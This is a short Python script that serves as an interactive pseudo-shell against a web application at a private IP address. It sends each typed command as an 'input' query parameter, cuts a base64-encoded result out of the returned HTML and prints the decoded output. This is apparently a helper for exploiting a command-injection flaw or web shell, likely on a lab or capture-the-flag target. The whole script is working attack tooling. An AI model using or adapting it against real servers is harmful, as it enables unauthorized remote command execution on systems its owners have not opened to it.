import requests as rq
import readline
from base64 import b64decode

url = 'https://192.168.112.13'


def req(cmd):
    res = rq.get(url, params={'input': cmd}).content
    start_ptrn = b'<p>\n              '
    end_ptrn = b'          </p'
    res = res[res.find(start_ptrn)+len(start_ptrn):]
    res = res[:res.find(end_ptrn)]
    res = b64decode(res).decode()
    print(res)
    return res


while True:
    cmd = input('> ')
    req(cmd)
